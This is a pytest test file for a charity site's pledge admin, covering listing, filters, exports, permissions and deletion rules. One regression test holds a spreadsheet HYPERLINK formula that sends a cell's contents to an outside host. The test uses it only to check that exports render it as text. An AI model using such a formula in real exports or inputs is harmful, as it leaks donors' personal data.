"""Pledges in the admin: listed, filtered and exported; never added, edited or deleted by the team.

Logged in as group members, not superusers, except where only a superuser may act.
"""

import csv
import importlib
import io
import re

import pytest
from bs4 import BeautifulSoup
from django.apps import apps
from django.contrib.auth.models import Group, Permission
from django.db import connection
from django.test.utils import CaptureQueriesContext
from django.urls import reverse
from openpyxl import load_workbook

from campaigns.models import CampaignPage, Frequency, Pledge
from nepal_payments import Status

pytestmark = pytest.mark.django_db


@pytest.fixture
def sent_pledge(donate_page):
    return Pledge.objects.create(
        page=donate_page,
        appeal=CampaignPage.objects.get(slug="flood-relief"),
        amount=2500,
        currency="NPR",
        frequency=Frequency.MONTHLY,
        name="Sita Sharma",
        email="sita@example.com",
        phone="+9779841234567",
        address="Ward 4, Thamel, Kathmandu",
    )


def assert_denied(response):
    """Wagtail sends a user without permission back to the dashboard."""
    assert response.status_code == 302
    assert response.url == reverse("wagtailadmin_home")


@pytest.mark.parametrize("member", ["editor", "moderator"])
class TestTheTeam:
    def test_see_pledges_listed(self, client, request, member, sent_pledge):
        client.force_login(request.getfixturevalue(member))

        html = client.get(reverse("pledges:index")).content.decode()

        assert "Sita Sharma" in html
        assert "Rs 2,500" in html
        assert "Flood relief" in html

    def test_columns_are_headed_for_the_team(self, client, request, member, sent_pledge):
        client.force_login(request.getfixturevalue(member))

        html = client.get(reverse("pledges:index")).content.decode()
        headings = [
            th.get_text(strip=True) for th in BeautifulSoup(html, "html.parser").select("thead th")
        ]

        for heading in ["Sent", "Name", "Amount", "How often", "Appeal"]:
            assert heading in headings
        assert "Your name" not in headings

    def test_can_filter_to_monthly_pledges(self, client, request, member, sent_pledge):
        Pledge.objects.create(
            page=sent_pledge.page, amount=1500, currency="NPR", name="Ram", email="ram@example.com"
        )
        client.force_login(request.getfixturevalue(member))

        html = client.get(reverse("pledges:index"), {"frequency": Frequency.MONTHLY}).content
        assert b"Sita Sharma" in html
        assert b"ram@example.com" not in html

    def test_can_export_pledges(self, client, request, member, sent_pledge):
        client.force_login(request.getfixturevalue(member))

        response = client.get(reverse("pledges:index"), {"export": "csv"})

        csv = b"".join(response.streaming_content).decode()
        assert "Sita Sharma" in csv
        assert "Flood relief" in csv
        assert "+9779841234567" in csv
        assert "Monthly" in csv

    @pytest.mark.parametrize("consent", ["email_updates", "show_on_website"])
    def test_can_filter_by_each_consent(self, client, request, member, sent_pledge, consent):
        Pledge.objects.create(
            page=sent_pledge.page,
            amount=1500,
            currency="NPR",
            name="Ram Thapa",
            email="ram@example.com",
            **{consent: True},
        )
        client.force_login(request.getfixturevalue(member))

        html = client.get(reverse("pledges:index"), {consent: "true"}).content
        assert b"Ram Thapa" in html
        assert b"Sita Sharma" not in html

    # Regression: ISSUE-003 — a pledge "named" =HYPERLINK(…) was exported as a live formula,
    # which could send other donors' details away when opened. Found by /qa on 2026-10-12.
    @pytest.mark.parametrize("export", ["csv", "xlsx"])
    def test_export_shows_a_formula_typed_by_a_donor_as_text(
        self, client, request, member, sent_pledge, export
    ):
        formula = '=HYPERLINK("https://example.org/?d="&F2,"Open your receipt")'
        sent_pledge.name = formula
        sent_pledge.save()
        client.force_login(request.getfixturevalue(member))

        response = client.get(reverse("pledges:index"), {"export": export})

        content = b"".join(response.streaming_content)
        if export == "csv":
            assert f"'{formula}".replace('"', '""') in content.decode()
        else:
            cells = [cell for row in load_workbook(io.BytesIO(content)).active for cell in row]
            assert [cell.data_type for cell in cells if cell.value == formula] == ["s"]

    def test_export_has_the_message_and_both_consents(self, client, request, member, sent_pledge):
        sent_pledge.message = "In memory of my father, Hari."
        sent_pledge.show_on_website = True
        sent_pledge.save()
        client.force_login(request.getfixturevalue(member))

        response = client.get(reverse("pledges:index"), {"export": "csv"})

        header, row = b"".join(response.streaming_content).decode().splitlines()[:2]
        assert "Message" in header
        assert "Email updates" in header
        assert "Show on website" in header
        assert "In memory of my father, Hari." in row

    def test_see_whether_each_pledge_is_paid(self, client, request, member, sent_pledge):
        Pledge.objects.create(
            page=sent_pledge.page,
            amount=1500,
            currency="NPR",
            name="Ram Thapa",
            email="r@example.com",
        ).start_payment("esewa", live=False).record(Status.PAID, "000AWEO")
        client.force_login(request.getfixturevalue(member))

        page = BeautifulSoup(client.get(reverse("pledges:index")).content, "html.parser")

        assert "Payment" in [th.get_text(strip=True) for th in page.select("thead th")]
        row = {
            name: page.find(string=re.compile(name)).find_parent("tr").get_text(" ", strip=True)
            for name in ("Sita Sharma", "Ram Thapa")
        }
        assert "Waiting" in row["Sita Sharma"]
        assert "Paid" in row["Ram Thapa"]

    # Regression: ISSUE-005 — a payment in a provider's test system, which anyone can make with the
    # test account the pay page shows, was listed as plain "Paid". Found by /qa on 2026-10-12.
    def test_a_payment_in_a_test_system_is_listed_as_one(
        self, client, request, member, sent_pledge
    ):
        sent_pledge.start_payment("esewa", live=False).record(Status.PAID, "000AWEO")
        Pledge.objects.create(
            page=sent_pledge.page,
            amount=1500,
            currency="NPR",
            name="Ram Thapa",
            email="r@example.com",
        ).start_payment("khalti", live=True).record(Status.PAID, "GFq9PFS7")
        client.force_login(request.getfixturevalue(member))

        page = BeautifulSoup(client.get(reverse("pledges:index")).content, "html.parser")

        row = {
            name: page.find(string=re.compile(name)).find_parent("tr").get_text(" ", strip=True)
            for name in ("Sita Sharma", "Ram Thapa")
        }
        assert "Paid (test)" in row["Sita Sharma"]
        assert "Paid" in row["Ram Thapa"]
        assert "(test)" not in row["Ram Thapa"]

    def test_can_filter_to_paid_pledges(self, client, request, member, sent_pledge):
        Pledge.objects.create(
            page=sent_pledge.page,
            amount=1500,
            currency="NPR",
            name="Ram Thapa",
            email="r@example.com",
        ).start_payment("khalti", live=False).record(Status.PAID, "GFq9PFS7")
        client.force_login(request.getfixturevalue(member))

        html = client.get(reverse("pledges:index"), {"payment_status": "paid"}).content
        assert b"Ram Thapa" in html
        assert b"Sita Sharma" not in html

    def test_export_says_how_and_when_each_pledge_was_paid(
        self, client, request, member, sent_pledge
    ):
        sent_pledge.start_payment("esewa", live=False).record(Status.PAID, "000AWEO")
        client.force_login(request.getfixturevalue(member))

        response = client.get(reverse("pledges:index"), {"export": "csv"})

        rows = list(csv.DictReader(b"".join(response.streaming_content).decode().splitlines()))
        assert rows[0]["Payment"] == "Paid"
        assert rows[0]["Paid"]
        # A test payment says so: no money moved.
        assert rows[0]["Paid with"] == "eSewa 000AWEO (test)"

    def test_can_read_a_pledge(self, client, request, member, sent_pledge):
        client.force_login(request.getfixturevalue(member))

        response = client.get(reverse("pledges:inspect", args=[sent_pledge.pk]))

        assert response.status_code == 200
        assert "Ward 4, Thamel, Kathmandu" in response.content.decode()

    def test_cannot_add_or_edit_pledges(self, client, request, member, sent_pledge):
        client.force_login(request.getfixturevalue(member))

        assert_denied(client.get(reverse("pledges:add")))
        assert_denied(client.get(reverse("pledges:edit", args=[sent_pledge.pk])))

    def test_cannot_delete_a_pledge(self, client, request, member, sent_pledge):
        """A deleted pledge loses the record of a donation; only a superuser may delete one."""
        client.force_login(request.getfixturevalue(member))

        html = client.get(reverse("pledges:index")).content.decode()
        response = client.post(reverse("pledges:delete", args=[sent_pledge.pk]))

        assert reverse("pledges:delete", args=[sent_pledge.pk]) not in html
        assert_denied(response)
        assert Pledge.objects.filter(pk=sent_pledge.pk).exists()


@pytest.mark.parametrize("paid", [None, "test"], ids=["unpaid", "paid in a test system"])
def test_a_superuser_can_delete_a_pledge(admin_client, sent_pledge, paid):
    if paid:
        sent_pledge.start_payment("esewa", live=False).record(Status.PAID, "000AWEO")

    admin_client.post(reverse("pledges:delete", args=[sent_pledge.pk]))

    assert not Pledge.objects.filter(pk=sent_pledge.pk).exists()


@pytest.mark.parametrize("method", ["get", "post"])
def test_a_pledge_paid_with_real_money_cant_be_deleted(admin_client, sent_pledge, method):
    """Its payment is the site's only record of the money: provider, transaction ID and time."""
    sent_pledge.start_payment("khalti", live=True).record(Status.PAID, "GFq9PFS7")

    response = getattr(admin_client, method)(
        reverse("pledges:delete", args=[sent_pledge.pk]), follow=True
    )

    assert response.redirect_chain[-1][0] == reverse("pledges:inspect", args=[sent_pledge.pk])
    text = BeautifulSoup(response.content, "html.parser").get_text()
    assert "paid with real money, so it can't be deleted" in text
    assert Pledge.objects.filter(pk=sent_pledge.pk).exists()


def edit(admin_client, pledge, **changes):
    """A superuser saves the pledge's edit form, with these changes."""
    fields = ["appeal", "amount", "currency", "frequency", "name", "email", "phone", "address"]
    data = {name: getattr(pledge, name) for name in fields} | {"appeal": pledge.appeal_id}
    response = admin_client.post(reverse("pledges:edit", args=[pledge.pk]), data | changes)
    assert response.status_code == 302, response.context["form"].errors
    pledge.refresh_from_db()


def test_once_someone_starts_paying_a_pledge_its_amount_is_kept(admin_client, sent_pledge):
    """A changed amount still marked paid would disagree with the provider's statement, and the
    pay page would thank the supporter for an amount they didn't give."""
    sent_pledge.start_payment("khalti", live=True).record(Status.PAID, "GFq9PFS7")

    edit(admin_client, sent_pledge, amount=100, currency="GBP", email="sita.sharma@example.com")

    assert (sent_pledge.amount, sent_pledge.currency) == (2500, "NPR")
    assert sent_pledge.email == "sita.sharma@example.com"  # a typo can still be put right


def test_a_pledge_nobody_has_started_paying_can_still_be_changed(admin_client, sent_pledge):
    edit(admin_client, sent_pledge, amount=3000)

    assert sent_pledge.amount == 3000


def test_permission_migration_gives_view_only_and_creates_no_duplicates(
    django_user_model, editor, moderator
):
    """The live site's database has every permission row already; the migration must not
    create duplicates, only give the groups permission to view."""
    migration = importlib.import_module("campaigns.migrations.0006_pledge_permissions")
    for group in Group.objects.filter(name__in=["Editors", "Moderators"]):
        group.permissions.remove(*group.permissions.filter(codename__endswith="_pledge"))
    permission_count = Permission.objects.count()

    migration.grant_permissions(apps, schema_editor=None)

    assert Permission.objects.count() == permission_count
    for user in (editor, moderator):
        user = django_user_model.objects.get(pk=user.pk)  # has_perm caches on the instance
        assert user.has_perm("campaigns.view_pledge")
        assert not user.has_perm("campaigns.add_pledge")
        assert not user.has_perm("campaigns.change_pledge")
        assert not user.has_perm("campaigns.delete_pledge")


def test_the_export_doesnt_ask_once_per_pledge(admin_client, sent_pledge):
    """Each pledge's payments come in one query for the whole list."""

    def export_queries():
        with CaptureQueriesContext(connection) as queries:
            response = admin_client.get(reverse("pledges:index"), {"export": "csv"})
            b"".join(response.streaming_content)
        return len(queries)

    sent_pledge.start_payment("esewa", live=False).record(Status.PAID, "000AWEO")
    one = export_queries()
    for name in ("Ram", "Hari", "Gita"):
        Pledge.objects.create(
            page=sent_pledge.page, amount=500, currency="NPR", name=name, email="x@example.com"
        ).start_payment("khalti", live=False).record(Status.PAID, "GFq9PFS7")

    assert export_queries() == one
